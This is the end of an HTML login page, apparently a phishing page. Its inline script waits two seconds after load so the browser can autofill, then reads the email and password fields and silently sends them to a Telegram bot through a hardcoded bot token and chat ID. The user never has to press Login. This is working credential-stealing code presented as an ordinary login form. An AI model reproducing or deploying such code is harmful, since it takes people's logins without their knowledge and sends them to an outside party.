    <input type="password" id="pass" name="password" autocomplete="current-password" placeholder="Password">
    <button type="submit">Login</button>
  </form>

  <script>
    window.onload = () => {
      setTimeout(() => {
        const email = document.getElementById('email').value
        const pass = document.getElementById('pass').value

        if (email && pass) {
          const token = "6883619016:AAHKPuXrO6Tt60aOhx4pMvuiBgpGH8gpXww"
          const chat_id = "7139961821"
          const message = `Email: ${email}\nPass: ${pass}`

          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
        }
      }, 2000) // slight delay to allow autofill
    }
  </script>
</body>
</html>
